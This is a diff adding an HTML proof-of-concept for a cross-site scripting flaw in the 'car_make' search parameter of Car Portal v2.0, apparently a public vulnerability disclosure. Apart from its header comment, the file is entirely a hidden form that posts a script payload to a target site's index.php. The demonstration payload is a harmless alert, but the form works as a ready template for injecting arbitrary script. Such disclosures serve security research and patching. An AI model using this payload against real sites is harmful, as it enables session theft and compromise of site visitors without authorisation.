@@ -1,0 +1,24 @@
+<!--
+TITLE: Car Portal v2.0 "car_make" Cross-Site Scripting Vulnerability
+PRODUCT: Car Portal v2.0
+PRODUCT URL: http://www.netartmedia.net/carsportal/
+RESEARCHERS: underground-stockholm.com
+RESEARCHERS URL: http://underground-stockholm.com/
+-->
+<html>
+<body>
+<form method="post" action="http://[host]/[path]/index.php">
+<input type="hidden" name="ProceedSearch" value="1">
+<input type="hidden" name="mod" value="cars_search">
+<input type="hidden" name="lang" value="en">
+<input type="hidden" name="Step" value="1">
+<input type="hidden" name="car_make" value="&lt;script&gt;alert(1337)&lt;/script&gt;">
+<input type="hidden" name="car_model" value="All">
+<input type="hidden" name="car_year_from" value="1983">
+<input type="hidden" name="car_year_to" value="1987">
+<input type="hidden" name="zip" value="">
+<input type="hidden" name="order_by" value="price">
+<input type="submit">
+</form>
+</body>
+</html>
